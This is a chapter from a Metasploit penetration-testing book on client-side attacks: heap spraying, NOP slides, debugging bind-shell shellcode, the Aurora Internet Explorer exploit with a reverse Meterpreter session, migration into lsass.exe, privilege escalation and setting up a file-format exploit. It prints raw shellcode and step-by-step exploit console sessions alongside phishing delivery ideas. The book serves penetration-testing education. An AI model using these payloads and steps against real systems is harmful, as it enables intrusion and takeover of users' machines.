<html><head></head><body><section epub:type="chapter" id="exploitation_using_client-side_attacks"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 8. Exploitation Using Client-Side Attacks</h2></div></div></div><p class="calibre2">Years of focus on defensive network perimeters have drastically shrunk the traditional attack surfaces. When one avenue of attack becomes too difficult to penetrate, attackers can find new and easier methods for attacking their targets. Client-side attacks were the next evolution of attacks after network defenses became more prominent. These attacks target software commonly installed on computers in such programs as web browsers, PDF readers, and Microsoft Office applications. Because these programs are commonly installed on computers out of the box, they are obvious attack vectors for hackers. It’s also common for these applications to be out of date on users’ machines because of irregular patching cycles. Metasploit includes a number of built-in client-side exploits, which we’ll cover in depth in this chapter.<a id="IDX-CHP-8-0001" class="strong"/><a id="IDX-CHP-8-0002" class="strong"/></p><p class="calibre2">If you can bypass all the protective countermeasures a company has in place and infiltrate a network by tricking a user into clicking a malicious link, you have a much better chance of achieving a compromise. Suppose, for example, that you are performing a covert penetration test against a corporate target using social engineering. You decide that sending a phishing email to targeted users will present your best chance of success. You harvest email accounts, names, and phone numbers; browse social-networking sites; and create a list of known employees. Your malicious email instructs the email recipients that payroll information needs to be updated; they need to click a link (a malicious link) in the email to do this. However, as soon as the user clicks the link, the machine is compromised, and you can access the organization’s internal network.<a id="IDX-CHP-8-0003" class="strong"/><a id="IDX-CHP-8-0004" class="strong"/><a id="IDX-CHP-8-0005" class="strong"/><a id="IDX-CHP-8-0006" class="strong"/><a id="IDX-CHP-8-0007" class="strong"/><a id="IDX-CHP-8-0008" class="strong"/></p><p class="calibre2">This scenario is a common technique regularly leveraged in both penetration tests and actual malicious attacks. It is often easier to attack via users than it is to exploit Internet-facing resources. Most organizations spend a significant amount of money protecting their Internet-facing systems with tools such as intrusion prevention systems (IPSs) and web application firewalls, while not investing nearly as much in educating their users about social-engineering attacks.</p><p class="calibre2">In March 2011, RSA, a well-known security company, was compromised by an attacker leveraging this same process. A malicious attacker sent an extremely targeted (spear-phishing) email that was crafted specifically for an Adobe Flash zero-day vulnerability. (<span class="strong"><em class="calibre4">Spear-phishing</em></span> is an attack whereby users are heavily researched and targeted rather than randomly chosen from a company address book.) In RSA’s case, the email targeted a small group of users and was able to compromise RSA’s internally connected systems and further penetrate its network.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="browser-based_exploits">Browser-Based Exploits</h2></div></div></div><p class="calibre2">We’ll focus on browser-based exploits within Metasploit in this chapter. <span class="strong"><em class="calibre4">Browser-based exploits</em></span> are important techniques, because in many organizations, users spend more time using their web browsers than using any other applications on their computers.<a id="IDX-CHP-8-0009" class="strong"/><a id="IDX-CHP-8-0010" class="strong"/><a id="IDX-CHP-8-0011" class="strong"/></p><p class="calibre2">Consider another scenario: We send an email to a small group at an organization with a link that each user will click. The users click the link, and their browsers open to our website, which has been specially crafted to exploit a vulnerability in a certain version of Internet Explorer. The users’ browser application is susceptible to this exploit and is now compromised simply by users visiting our malicious website. On our end, access would be gained via a payload (Meterpreter, for example) running within the context of the user who visited the site.</p><p class="calibre2">Note one important element in this example: If the target user were running as an administrator, the attacker (we) would do the same. Client-side exploits traditionally run with the same permissions and rights as the target they exploit. Often this is a regular user without administrative privileges, so we would need to perform a <span class="strong"><em class="calibre4">privilege-escalation attack</em></span> to obtain additional access, and an additional exploit would be necessary to elevate privileges. We could also potentially attack other systems on the network in hopes of gaining administrative-level access. In other cases, however, the current user’s permission levels are enough to achieve the infiltration. Consider your network situation: Is your important data accessible via user accounts? Or is it accessible only to the administrator account?<a id="IDX-CHP-8-0012" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="how_browser-based_exploits_work">How Browser-Based Exploits Work</h3></div></div></div><p class="calibre2">Browser exploits are similar to any traditional exploit but with one major difference: the method used for shellcode delivery. In a traditional exploit, the attacker’s entire goal is to gain remote code execution and deliver a malicious payload. In browser exploits, the most traditional way to gain remote code execution is through an exploitation technique called <span class="strong"><em class="calibre4">heap spraying</em></span>. But before examining heap spraying in detail, let’s talk about what the <span class="strong"><em class="calibre4">heap</em></span> is and how it’s used.<a id="IDX-CHP-8-0013" class="strong"/><a id="IDX-CHP-8-0014" class="strong"/><a id="IDX-CHP-8-0015" class="strong"/></p><p class="calibre2">The heap is memory that is unallocated and used by the application as needed for the duration of the program’s runtime. The application will allocate whatever memory is necessary to complete whatever task is at hand. The heap is based on how much memory your computer has available and has used through the entire application’s life cycle. The location of memory allocated at runtime is not known in advance, so as attackers, we would not know where to place our shellcode. Hackers can’t simply call a memory address and hope to land at the payload — the randomness of memory allocated by the heap prevents this, and this randomness was a major challenge before heap spraying was discovered.</p><p class="calibre2">Before moving on, you also need to understand the concept of a <span class="strong"><em class="calibre4">no-operation instruction (NOP)</em></span> and <span class="strong"><em class="calibre4">NOP slide</em></span>. NOPs are covered in detail in <a class="xref" href="part0019.html#porting_exploits_to_the_metasploit_frame">Chapter 15</a>, but we’ll cover the basics here because they are important to understanding how heap spraying works. A NOP is an assembly instruction that says, “Do nothing and move to the next instruction.” A NOP slide comprises multiple NOPs adjacent to each other in memory, basically taking up space. If a program’s execution flow encounters a series of NOP instructions, it will linearly “slide” down to the end of them to the next instruction. A NOP, in the Intel x86 architecture, has an opcode of 90, commonly seen in exploit code as <code class="literal">\x90</code>.</p><p class="calibre2">The heap spraying technique involves filling the heap with a known repeating pattern of NOP slides and your shellcode until you fill the entire memory space with this known value. You’ll recall that memory in the heap is dynamically allocated at program runtime. This is usually done via JavaScript, which causes the browser’s allocated memory to grow significantly. The attacker fills large blocks of memory with NOP slides and shellcode directly after them. When program execution flow is altered and randomly jumps somewhere into memory, there is a good chance of hitting a NOP slide and eventually hitting the shellcode. Instead of looking for a needle in a haystack — that is, the shellcode in memory — heap spraying offers an 85 to 90 percent chance of the exploit being successful.<a id="IDX-CHP-8-0016" class="strong"/><a id="IDX-CHP-8-0017" class="strong"/></p><p class="calibre2">This technique changed the game in browser exploitation and in the reliability of exploiting browser bugs. We will not be covering the actual code behind heap spraying, because it’s an advanced exploitation topic, but you should know the basics so that you can understand how these browser-based exploits work. Before we begin launching our first browser exploit, let’s look at what actually happens behind the scenes when an exploit is launched.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="looking_at_nops">Looking at NOPs</h3></div></div></div><p class="calibre2">Now that you understand the basics of a heap spray and a NOP, let’s take a look at a generic NOP slide in an actual exploit. In the following listing, notice the hexadecimal representation of <code class="literal">\x90</code>, the Intel x86 architecture opcode. A <span class="strong"><em class="calibre4">90</em></span> in Intel x86 assembly is a NOP. Here you see a series of <code class="literal">\x90</code>s that create our NOP-slide effect. The rest of the code is the payload, such as a reverse shell or a Meterpreter shell.<a id="IDX-CHP-8-0018" class="strong"/><a id="IDX-CHP-8-0019" class="strong"/><a id="IDX-CHP-8-0020" class="strong"/><a id="IDX-CHP-8-0021" class="strong"/></p><a id="I_programlisting8_d1e10008" class="strong"/><pre class="programlisting"><strong class="calibre3"><code class="calibre6">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</code></strong>
<strong class="calibre3"><code class="calibre6">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</code></strong>
<strong class="calibre3"><code class="calibre6">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</code></strong>
\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30
\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff
\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2
\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85
\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3
\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d
\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58
\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b
\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff
\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68
\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01
\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50
\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x31
\xdb\x53\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\xc2
\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5\x53
\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d
\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff
\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58
\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9
\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3</pre></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="using_immunity_debugger_to_decipher_nop">Using Immunity Debugger to Decipher NOP Shellcode</h2></div></div></div><p class="calibre2"><span class="strong"><em class="calibre4">Debuggers</em></span> offer a window into the running state of a program, including assembly instruction flow, memory contents, and exception details. Penetration testers leverage debuggers on a regular basis to identify zero-day vulnerabilities and to understand how an application works and how to attack it. A number of debuggers are out there, but our personal preference going forward (and used in later chapters) is Immunity Debugger. We recommend that you take a look at the basics of Immunity Debugger before proceeding.<a id="IDX-CHP-8-0022" class="strong"/></p><p class="calibre2">To understand what a NOP slide does, let’s use a debugger to look at how the NOP shellcode in the preceding example works. On your Windows XP target, download and install Immunity Debugger from <a class="xref" href="http://www.immunityinc.com/" target="_top">http://www.immunityinc.com/</a>. We’ll use the <code class="literal">msfpayload</code> command to generate sample shellcode for a simple TCP bind shell, listening on port 443. As you learned in previous chapters, a bind shell simply listens on a port on a target machine to which we can connect.<a id="IDX-CHP-8-0023" class="strong"/><a id="IDX-CHP-8-0024" class="strong"/><a id="IDX-CHP-8-0025" class="strong"/><a id="IDX-CHP-8-0026" class="strong"/><a id="IDX-CHP-8-0027" class="strong"/><a id="IDX-CHP-8-0028" class="strong"/></p><a id="I_programlisting8_d1e10055" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">msfpayload windows/shell/bind_tcp LPORT=443 C</code></strong></pre><p class="calibre2">When these commands are executed, “stage 1” and “stage 2” shellcodes are created in the output. We are concerned only with the stage 1 shellcode, because Metasploit will handle sending the second stage for us when we connect to it. Copy and paste the shellcode from stage 1 into a text editor of your choice. You’ll need to do some minor editing before proceeding.</p><p class="calibre2">Now that you have your basic shellcode, add as many NOPs as you want to the beginning of it (such as <code class="literal">\x90\x90\x90\x90\x90</code>). Then remove all <code class="literal">\x</code> occurrences so it looks similar to the following:</p><a id="I_programlisting8_d1e10069" class="strong"/><pre class="programlisting">9090909090909090909090909090909090909090909090909
09090909090909090909090909090909090909090f
ce8890000006089e531d2648b52308b520c8b52148b72280fb74a26
31ff31c0ac3c617c022c20c1cf0d01c7e2f0
52578b52108b423c01d08b407885c0744a01d0508b48188
b582001d3e33c498b348b01d631ff31c0acc1cf0d01c
738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d
38b048b01d0894424245b5b61595a51ffe058
5f5a8b12eb865d6833320000687773325f54684c772607ffd5b8
9001000029c454506829806b00ffd5505050504
050405068ea0fdfe0ffd59731db5368020001bb89e66a105657
68c2db3767ffd5535768b7e938ffffd553535768
74ec3be1ffd5579768756e4d61ffd56a006a0456576802d9c85fffd58b
366a406800100000566a006858a453e5f
fd593536a005653576802d9c85fffd501c329c685f675<strong class="calibre3"><code class="calibre6">ecc3</code></strong></pre><p class="calibre2">All this is necessary because you need to use a particular format so that Immunity Debugger will accept your copy-and-paste of assembly instructions. Now you have a bind shell with some NOPs in front of it for testing. Next, open up any executable — let’s use <span class="strong"><em class="calibre4">iexplore.exe</em></span> for this example. Open Immunity Debugger, choose <span class="strong"><strong class="calibre3">File</strong></span> ▸ <span class="strong"><strong class="calibre3">Open</strong></span>, and point to an executable. You should see a number of assembly instructions in the main window (the largest one). Left-click the first instruction on the screen, and hold down shift while left-clicking to highlight about 300 instructions below it.</p><p class="calibre2">Copy the shellcode to the clipboard, and right-click in the Immunity Debugger window and choose <span class="strong"><strong class="calibre3">Binary</strong></span> ▸ <span class="strong"><strong class="calibre3">Binary paste</strong></span>. This will paste the assembly instructions from the example into the Immunity Debugger window. (Remember that we are doing this to identify how NOPs work and how assembly instructions are executed.)</p><p class="calibre2">You can see in <a class="xref" href="part0012.html#examples_of_multiple_nops_that_create_th">Figure 8-1</a> that a number of NOPs are inserted; if you were to scroll down, you would see your shellcode.</p><p class="calibre2">When we first exported our shellcode in a <code class="literal">bind_tcp</code> format, the last instruction through stage 1 ended with <code class="literal">ecc3</code>. Locate the last set of memory instructions we added ending in <code class="literal">ecc3</code>.</p><p class="calibre2">Right after the <code class="literal">ecc3</code>, press F2 to create a breakpoint. When you add a breakpoint, once execution flow encounters it, program execution will pause and will not continue. This is important here, because the code still has a lot of the old remnants of the application we opened, and continuing would cause the application to crash, because we already inserted our own code into it. We want to stop and investigate what happened before the application crashes.</p><div class="figure"><a id="examples_of_multiple_nops_that_create_th" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject8_d1e10116" class="strong"/><img src="../images/00036.jpeg" alt="Examples of multiple NOPs that create the NOP slide" hisrc="httpatomoreillycomsourcenostarchimages867526.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 8-1. Examples of multiple NOPs that create the NOP slide</div></div><p class="calibre2">In the example in <a class="xref" href="part0012.html#the_last_part_of_our_instruction_set_tha">Figure 8-2</a>, notice the last instruction set, which is a <code class="literal">C3</code>. That is the last instruction set in our bind shell that we need.<a id="IDX-CHP-8-0029" class="strong"/><a id="IDX-CHP-8-0030" class="strong"/><a id="IDX-CHP-8-0031" class="strong"/><a id="IDX-CHP-8-0032" class="strong"/></p><p class="calibre2">After that <code class="literal">C3</code>, press F2, which sets up another breakpoint. Now we’re ready to roll and see what happens. Go back to the very top, where you added your NOPs, and press F7, which tells the debugger to execute the next assembly command, stepping into your next assembly instruction. Notice that the highlight moves down one line. Nothing happened because you added a NOP.</p><p class="calibre2">Next, press F7 a few times to walk down the NOP slide. When you first arrive at the memory instructions, open up a command prompt and type <strong class="calibre3"><code class="calibre6">netstat -an</code></strong>. Nothing should be listening on 443, and this is a good sign that your payload hasn’t executed yet.</p><p class="calibre2">Press F5 to continue running the rest of the application until it reaches the breakpoint that you set. You should see the breakpoint indicated in the lower-left corner of the Immunity Debugger window. At this point, you have executed your payload within the debugger, and you should now be able to check <code class="literal">netstat -an</code> and notice port 443 listening.<a id="IDX-CHP-8-0033" class="strong"/></p><p class="calibre2">On a remote machine, try to telnet to the target machine on port 443. You’ll notice that nothing happens; this is because the listener hasn’t received the second stage from Metasploit yet. On your Back|Track VM, go into Metasploit and set up a multi-handler. This will tell Metasploit that a first-stage listener is on port 443 on the target machine.</p><div class="figure"><a id="the_last_part_of_our_instruction_set_tha" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject8_d1e10171" class="strong"/><img src="../images/00037.jpeg" alt="The last part of our instruction set that we need" hisrc="httpatomoreillycomsourcenostarchimages867528.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 8-2. The last part of our instruction set that we need</div></div><a id="I_programlisting8_d1e10176" class="strong"/><pre class="programlisting">msf &gt;<strong class="calibre3"><code class="calibre6">use multi/handler</code></strong>
msf exploit(handler) &gt;<strong class="calibre3"><code class="calibre6">set payload windows/shell/bind_tcp</code></strong>
payload =&gt; windows/shell/bind_tcp
msf exploit(handler) &gt;<strong class="calibre3"><code class="calibre6">set LPORT 443</code></strong>
LPORT =&gt; 443
msf exploit(handler) &gt;<strong class="calibre3"><code class="calibre6">set RHOST 192.168.33.130</code></strong>
RHOST =&gt; 192.168.33.130
msf exploit(handler) &gt;<strong class="calibre3"><code class="calibre6">exploit</code></strong>
[*] Starting the payload handler...
[*] Started bind handler
[*] Sending stage (240 bytes)
[*] Command shell session 1 opened (192.168.33.129:60463 -&gt; 192.168.33.130:443)</pre><p class="calibre2">You have reached a basic command shell! As a good practicing technique, try a stage 1 Meterpreter reverse and see if you can get a connection. When you are finished, simply close the Immunity Debugger window and you’re all done. It’s important that you get familiar with Immunity Debugger now, because we will be leveraging it in later chapters. Now let’s launch our first browser exploit that uses a heap spray.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="exploring_the_internet_explorer_aurora_e">Exploring the Internet Explorer Aurora Exploit</h2></div></div></div><p class="calibre2">You know the basics of how heap sprays work and how you can dynamically allocate memory and fill the heap up with NOPs and shellcode. We’ll be leveraging an exploit that uses this technique and something found in nearly every client-side exploit. The browser exploit of choice here is the Aurora exploit (Microsoft Security Bulletin MS10-002). Aurora was most notoriously used in the attacks against Google and more than 20 other large technology companies. Although this exploit was released in early 2010, it particularly resonates with us because it took down some major players in the technology industry.<a id="IDX-CHP-8-0034" class="strong"/><a id="IDX-CHP-8-0035" class="strong"/><a id="IDX-CHP-8-0036" class="strong"/><a id="IDX-CHP-8-0037" class="strong"/></p><p class="calibre2">We’ll start by using the Aurora Metasploit module and then set our payload. The following commands should be familiar, because we have used them in previous chapters. You’ll also see a couple of new options that we’ll discuss in a bit.</p><a id="I_programlisting8_d1e10220" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use windows/browser/ms10_002_aurora</code></strong>
msf exploit(ms10_002_aurora) &gt; <strong class="calibre3"><code class="calibre6">set payload windows/meterpreter/reverse_tcp</code></strong>
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(ms10_002_aurora) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>

Module options:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SRVHOST     0.0.0.0 <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>        yes       The local host to listen on.
   SRVPORT     8080 <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>           yes       The local port to listen on.
   SSL         false             no        Negotiate SSL for incoming connections
   SSLVersion  SSL3              no        Specify the version of
 SSL that should be used
                                                (accepted: SSL2, SSL3, TLS1)
   URIPATH <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
                  no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process
   LHOST                      yes       The local address
   LPORT     4444             yes       The local port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf exploit(ms10_002_aurora) &gt; <strong class="calibre3"><code class="calibre6">set SRVPORT 80</code></strong>
SRVPORT =&gt; 80
msf exploit(ms10_002_aurora) &gt; <strong class="calibre3"><code class="calibre6">set URIPATH /</code></strong> <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>
URIPATH =&gt; /
msf exploit(ms10_002_aurora) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 192.168.33.129</code></strong>
LHOST =&gt; 192.168.33.129
msf exploit(ms10_002_aurora) &gt; <strong class="calibre3"><code class="calibre6">set LPORT 443</code></strong>
LPORT =&gt; 443
msf exploit(ms10_002_aurora) &gt; <strong class="calibre3"><code class="calibre6">exploit -z</code></strong>
[*] Exploit running as background job.
msf exploit(ms10_002_aurora) &gt;
[*] Started reverse handler on 192.168.33.129:443
[*] Using URL: http://0.0.0.0:80/
[*] Local IP: http://192.168.33.129:80/
[*] Server started.

msf exploit(ms10_002_aurora) &gt;</pre><p class="calibre2">First, notice that the default setting for <code class="literal">SRVHOST</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject8_d1e10277" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> is 0.0.0.0: This means that the web server will bind to all interfaces. The <code class="literal">SRVPORT</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject8_d1e10286" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, 8080, is the port to which the targeted user needs to connect for the exploit to trigger. We will be using port 80 instead of 8080, however. We could also set up the server for SSL, but for this example, we’ll stick with standard HTTP. <code class="literal">URIPATH</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject8_d1e10296" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> is the URL the user will need to enter to trigger the vulnerability, and we set this to a slash (<code class="literal">/</code>) at <span class="inlinemediaobject"><a id="I_inlinemediaobject8_d1e10305" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>.<a id="IDX-CHP-8-0038" class="strong"/><a id="IDX-CHP-8-0039" class="strong"/><a id="IDX-CHP-8-0040" class="strong"/><a id="IDX-CHP-8-0041" class="strong"/><a id="IDX-CHP-8-0042" class="strong"/><a id="IDX-CHP-8-0043" class="strong"/><a id="IDX-CHP-8-0044" class="strong"/><a id="IDX-CHP-8-0045" class="strong"/></p><p class="calibre2">With our settings defined, use your Windows XP virtual machine and connect to the attacker using <span class="strong"><em class="calibre4">http://</em></span>&lt;<span class="strong"><em class="calibre4">attacker’s IP address</em></span>&gt;. You’ll notice the machine becomes a bit sluggish. After a little waiting, you should see a Meterpreter shell. In the background, the heap spray was performed and the jump into the dynamic memory was executed, to hit your shellcode eventually. If you open Task Manager in Windows before you run this exploit, you can actually see the memory for <span class="strong"><em class="calibre4">iexplore.exe</em></span> growing significantly based on the contact growth of the heap.</p><a id="I_programlisting8_d1e10347" class="strong"/><pre class="programlisting">msf exploit(ms10_002_aurora) &gt;
[*] Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.33.130
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:443 -&gt; 192.168.33.130:1161)

msf exploit(ms10_002_aurora) &gt; <strong class="calibre3"><code class="calibre6">sessions -i 1</code></strong>
[*] Starting interaction with 1...

meterpreter &gt;</pre><p class="calibre2">You now have a Meterpreter shell, but there’s a slight problem. What if the targeted user closes the browser based on the sluggishness of her computer? You would effectively lose your session to the target, and although the exploit is successful, it would be cut off prematurely. Fortunately, there is a way around this: Simply type <strong class="calibre3"><code class="calibre6">run migrate</code></strong> as soon as the connection is established, and hope that you make it in time. This Meterpreter script automatically migrates to the memory space of a separate process, usually <span class="strong"><em class="calibre4">lsass.exe</em></span>, to improve the chances of keeping your shell open if the targeted user closes the originally exploited process.</p><a id="I_programlisting8_d1e10360" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run migrate</code></strong>
[*] Current server process: IEXPLORE.EXE (2120)
[*] Migrating to lsass.exe...
[*] Migrating into process ID 680
[*] New server process: lsass.exe (680)
meterpreter &gt;</pre><p class="calibre2">This is a pretty manual process. You can automate this whole process using some advanced options to migrate to a process automatically upon a successful shell. Type <strong class="calibre3"><code class="calibre6">show advanced</code></strong> to list the advanced features of the Aurora module:<a id="IDX-CHP-8-0046" class="strong"/></p><a id="I_programlisting8_d1e10373" class="strong"/><pre class="programlisting">msf exploit(ms10_002_aurora) &gt; <strong class="calibre3"><code class="calibre6">show advanced</code></strong>

Module advanced options:

   Name           : ContextInformationFile
   Current Setting:
   Description    : The information file that contains context information

   Name           : DisablePayloadHandler
   Current Setting: false
   Description    : Disable the handler code for the selected payload

   Name           : EnableContextEncoding
   Current Setting: false
   Description    : Use transient context when encoding payloads

   Name           : WORKSPACE
   Current Setting:
   Description    : Specify the workspace for this module

Payload advanced options (windows/meterpreter/reverse_tcp):

   Name           : AutoLoadStdapi
   Current Setting: true
   Description    : Automatically load the Stdapi extension

   Name           : AutoRunScript
   Current Setting:
   Description    : A script to run automatically on session creation.

   Name           : AutoSystemInfo
   Current Setting: true
   Description    : Automatically capture system information on initialization.

   Name           : InitialAutoRunScript
   Current Setting:
   Description    : An initial script to run on session created (before AutoRunScript)

   Name           : ReverseConnectRetries
   Current Setting: 5
   Description    : The number of connection attempts
 to try before exiting the process
   Name           : WORKSPACE
   Current Setting:
   Description    : Specify the workspace for this module

msf exploit(ms10_002_aurora) &gt;</pre><p class="calibre2">By setting these options, you can fine-tune a lot of the payload and exploit details. Now suppose you wanted to change the amount of tries a reverse connection would do. The default is 5, but you might be concerned with timeouts and want to increase the connection retries. Here, we set it to 10:<a id="IDX-CHP-8-0047" class="strong"/><a id="IDX-CHP-8-0048" class="strong"/><a id="IDX-CHP-8-0049" class="strong"/><a id="IDX-CHP-8-0050" class="strong"/><a id="IDX-CHP-8-0051" class="strong"/></p><a id="I_programlisting8_d1e10396" class="strong"/><pre class="programlisting">msf exploit(ms10_002_aurora) &gt; <strong class="calibre3"><code class="calibre6">set ReverseConnectRetries 10</code></strong></pre><p class="calibre2">In this case, you want to migrate automatically to a new process in case the targeted user closes the browser right away. Under the <code class="literal">AutoRunScript</code>, simply let Metasploit know to autorun a script as soon as a Meterpreter console is created. Using the <code class="literal">migrate</code> command with the <code class="literal">-f</code> switch tells Meterpreter to launch a new process automatically and migrate to it:</p><a id="I_programlisting8_d1e10411" class="strong"/><pre class="programlisting">msf exploit(ms10_002_aurora) &gt; <strong class="calibre3"><code class="calibre6">set AutoRunScript migrate -f</code></strong></pre><p class="calibre2">Now attempt to run the exploit and see what happens. Try closing the connection and see if your Meterpreter session still stays active.</p><p class="calibre2">Since this is a browser-based exploit, you will most likely be running as a limited user account. Remember to issue the <code class="literal">use priv</code> and <code class="literal">getsystem</code> commands to attempt privilege escalation on the target machine.<a id="IDX-CHP-8-0052" class="strong"/></p><p class="calibre2">That’s it! You just successfully executed your first client-side attack using a pretty famous exploit. Note that new exploits are frequently being released, so be sure to search for all the browser exploits and find which one best suits your needs for a particular target.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="file_format_exploits">File Format Exploits</h2></div></div></div><p class="calibre2"><span class="strong"><em class="calibre4">File format bugs</em></span> are exploitable vulnerabilities found within a given application, such as an Adobe PDF document. This class of exploit relies on a user actually opening a malicious file in a vulnerable application. Malicious files can be hosted remotely or sent via email. We briefly mentioned leveraging file format bugs as a spear-phishing attack in the beginning of this chapter, and we’ll offer more about spear-phishing in <a class="xref" href="part0014.html#the_social-engineer_toolkit">Chapter 10</a>.<a id="IDX-CHP-8-0053" class="strong"/></p><p class="calibre2">In traditional file format exploits, you could leverage anything to which you think your target will be susceptible. This could be a Microsoft Word document, a PDF, an image, or anything else that might be applicable. In this example, we’ll be leveraging MS11-006, known as the Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow.<a id="IDX-CHP-8-0054" class="strong"/><a id="IDX-CHP-8-0055" class="strong"/><a id="IDX-CHP-8-0056" class="strong"/><a id="IDX-CHP-8-0057" class="strong"/></p><p class="calibre2">Within Metasploit, perform a search for <code class="literal">ms11_006</code>. Our first step is to get into our exploit through <span class="strong"><em class="calibre4">msfconsole</em></span>, and type <strong class="calibre3"><code class="calibre6">info</code></strong> to see what options are available. In the next example, you can see that the file format is exported as a document:<a id="IDX-CHP-8-0058" class="strong"/><a id="IDX-CHP-8-0059" class="strong"/><a id="IDX-CHP-8-0060" class="strong"/><a id="IDX-CHP-8-0061" class="strong"/></p><a id="I_programlisting8_d1e10495" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use windows/fileformat/ms11_006_createsizeddibsection</code></strong>
msf exploit(ms11_006_createsizeddibsection) &gt; <strong class="calibre3"><code class="calibre6">info</code></strong>

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   Windows 2000 SP0/SP4 English
  2   Windows XP SP3 English
  3   Crash Target for Debugging</pre><p class="calibre2">Next, you can see that we have a few targets available to use, but we’ll make it automatic and leave everything at the default settings:</p><a id="I_programlisting8_d1e10508" class="strong"/><pre class="programlisting">Basic options:
  Name        Current Setting                      Required  Description
  ----        ---------------                      --------  -----------
  FILENAME    msf.doc                              yes       The file name.
  OUTPUTPATH  /opt/metasploit3/msf3/data/exploits  yes       The location of the file.</pre><p class="calibre2">We’ll need to set a payload as usual. In this case, we will select our first choice, a reverse Meterpreter shell:</p><a id="I_programlisting8_d1e10512" class="strong"/><pre class="programlisting">msf exploit(ms11_006_createsizeddibsection) &gt;
<strong class="calibre3"><code class="calibre6">set payloadwindows/meterpreter/reverse_tcp</code></strong>
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(ms11_006_createsizeddibsection) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 172.16.32.128</code></strong>
LHOST =&gt; 172.16.32.128
smsf exploit(ms11_006_createsizeddibsection) &gt; <strong class="calibre3"><code class="calibre6">set LPORT 443</code></strong>
LPORT =&gt; 443
